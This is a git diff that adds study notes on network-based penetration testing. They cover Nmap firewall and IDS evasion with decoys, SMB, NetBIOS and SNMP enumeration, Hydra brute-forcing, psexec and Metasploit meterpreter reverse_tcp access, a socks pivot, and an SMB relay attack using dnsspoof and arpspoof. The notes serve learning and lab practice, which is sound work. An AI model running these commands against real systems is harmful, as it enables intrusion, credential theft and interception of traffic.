@@ -2475,3 +2475,165 @@ run  # Run the module
 ```
 
 This will create a password file and we can un-shadow the password (in the following chapters)!
+
+
+## Host & Network Penetration Testing: Network-Based Attacks
+
+### Firewall Detection and IDS Evasion
+
+We'll use Nmap to perform different techniques to detect firewall and hide the source of our ip.
+
+```bash
+nmap -sn target-ip  # Perform a scan on the target
+nmap -Pn -sS -F target-ip  # Scan the most common ports on the target
+nmap -Pn -sA -p445,3389 target-ip  # Scan those two ports to see if they are filtered (= have firewall) or not
+nmap -Pn -sS -sV -F -f target-ip  # Scan the ports for service version and with fragmented (f) packets in order to reduce the chances to be detected
+nmap -Pn -sS -sV -F -f --mtu number target-ip  # Same as above but with the Maximum Transmit Unit, in order to arbitrary change the dimension of the fragmented packets
+nmap -Pn -sS -sV -F -f --data-length 200 -D decoy-ip1,decoy-ip2 -g decoy-port target-ip  # Same as above but this time using an arbitrary data length of the packet and using different ip as a decoy (-D) to hide your real ip (it's better if the decoy(s) looks like part of the target net too) and you can change the decoy port (g)
+```
+
+### SMB & NetBIOS Enumeration
+
+NetBIOS (Network Basic Input/Output System) is an API and a set of network protocols for providing communication services on a local network.
+<br>
+It allows applications on different computers to interact with each other.
+<br>
+It usually uses port 137-138-139 and it offers three functions:
+<li>Name Service (NetBIOS-NS): allow computer to register and solve names in a local network</li>
+<li>Datagram Service (NetBIOS-DGM): supports connectionless communication and broadcasting</li>
+<li>Session Service (NetBIOS-SSN): supports connection-oriented communication for more reliable data transfer</li>
+<br>
+SMB is a file-sharing protocol that allows computers to share files, printers and other resources in a network and it uses port 445.
+
+```bash
+nmap target-ip  # Perform a standard scan
+nmap -sU -sV -T4 --script nbscan.nse -p137 -Pn -n target-ip  # Perform a more advanced scan
+nmap -sV -p139,445 target-ip  # Perform a service version scan on the two ports
+nmap -p445 --script smb-protocols target-ip  # Perform a scan to detect smb protocols
+nmap -p445 --script smb-security-mode target-ip  # Perform a scan to detect accounts on the smb protocol
+smbclient -L target-ip  # Connect with smb
+# Try to login anonymously, without entering a password
+nmap -p445 --script smb-enum-users.nse target-ip  # Perform a scan to detect all the account on the system
+```
+
+With the anonymous access we have got all the accounts on the system.
+<br>
+Now we can save them in a file and perform brute-force to try to get their passwords too.
+
+```bash
+# save usernames in a file (users.txt)
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target-ip smb  # Use hydra to perform brute-force to try to get the password of the accounts
+psexec.py username@target-ip  # Use Psexec to login with SMB with an account 
+# Write password
+```
+
+Now you have access to the smb of a target user and you can perform commands on the target!
+
+#### SMB exploit with Metasploit framework 
+
+You can use Metasploit framework to exploit smb, too.
+
+```bash
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+search psexec  # Search for psexec modules
+use exploit/windows/smb/psexec  # Use this exploit module
+set RHOSTS target-ip  # Set the target ip
+set SMBUser target-username  # Set the SMBUser with the username you found
+set SMBPass target-password  # Set the SMBPass with the password you found
+set payload windows/x64/meterpreter/reverse_tcp  # Configure a meterpreter for Windows x64 in this case
+exploit  # Start the exploit
+```
+
+Now you'll have a meterpreter session on the target, with the account you have got!
+
+#### Another SMB exploit with Metasploit framework
+
+In this other example we'll use Metasploit framework to exploit a socks version of smb.
+
+```bash
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+search socks  # Search for socks version
+use auxiliary/server/socks_proxy  # Use this Auxiliary module
+set VERSION 4a  # Set the version used by the target
+set SRVPORT 9050  # Set the port
+exploit  # Exploit 
+# On another terminal
+proxychains nmap target-ip -sT -Pn -sV -p 445  # Perform a proxychains scan with Nmap
+# On msfconsole
+migrate -N explorer.exe  # Migrate it to explorer.exe
+net view target-ip  # Net view the shares on the target
+```
+
+Now you have a meterpreter session with the shares on the smb and you can try to access them.
+
+```bash
+net use D: \\target-ip\share 
+```
+
+Now you can explore the share(s) of the user(s)!
+
+
+### SNMP Enumeration
+
+SNMP (Simple Network Management Protocol) is an application layer protocol that uses UDP for transport, for monitoring and managing network devices. System administrators can query devices to gain information on the devices on the network.
+<br>
+It works on ports 161 and 162 and there are 3 components:
+<li>SNMP Manager: querying and interacting with SNMP Agents on devices</li>
+<li>SNMP Agent: software running on the devices that responds to the SNMP Manager</li>
+<li>Management Information Base (MIB): a database that defines the structure of data available to SNMP</li>
+
+<br>
+In the process we'll:
+<li>identify SNMP-Enabled Devices</li>
+<li>Extract System Information</li>
+<li>Identify SNMP Community Strings</li>
+<li>Retrieve Network Configurations</li>
+<li>Collect User and Group Information</li>
+<li>Identify Services and Applications</li>
+
+```bash
+nmap -sU -p 161 target-ip  # Perform a scan on the 161 port
+nmap -sU -p 161 --script snmp-brute target-ip  # Perform a brute force on the SNMP
+nmap -sU -p 161 --script snmp-* target-ip > snmp_info  # Perform a scan with all the SNMP scripts and save them in a file
+cat snmp_info  # Open the file and read the results
+```
+
+Now we have enumerated many informations about the SNMP!
+<br>
+We have also enumerated the users on the SNMP and thus we can use Hydra to try to brute-force their passwords.
+
+```bash
+hydra -L username -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target-ip smb
+```
+
+After you get a complete credentials you can try to use psexec to exploit and gain access.
+
+
+### SMB Relay Attack
+
+The SMB Relay is a type of attack where the SMB is intercepted and redirected to a legitimate server in order to obtain unauthorized access to the target.
+<li>Interception: using techniques like man-in-the-middle such as ARP spoofing, DNS poisoning or setting a rogue SMB server</li>
+<li>Capturing Authentication: When a client logs to smb, the attacker captures the signal</li>
+<li>Relaying to a legitimate server: Redirect the signal to a legitimate server instead of the target server</li>
+<li>Gain Access: Now the attacker can gain access to the smb</li>
+
+```bash
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+search smb_relay  # Search for the module
+use exploit/windows/smb/smb_relay  # Use the module
+set SRVHOST your-ip  # Set the server host 
+set LHOST your-ip  # Set the LHOST
+set SMBHOST target-ip  # Set the target ip
+exploit  # Start the exploit
+# In another shell
+echo "your-ip *.target-website.com" > dns  # Create a file with your ip and the target website, in order to create a fake dns file that will be used to spoof the signals
+dnsspoof -i eth1 -f dns  # Set up a dns spoof, passing the file
+# In another shell
+echo 1 > /proc/sys/net/ipv4/ip forward  
+arpspoof -i eth1 -t target-ip target-ip.1  # Set the arpspoof
+# In another shell
+arpspoof -i eth1 -t target-ip.1 target-ip  # Set the reverse arpspoof
+```
+
+With this you can spoof dns connections since they will be redirected to your machine!
+
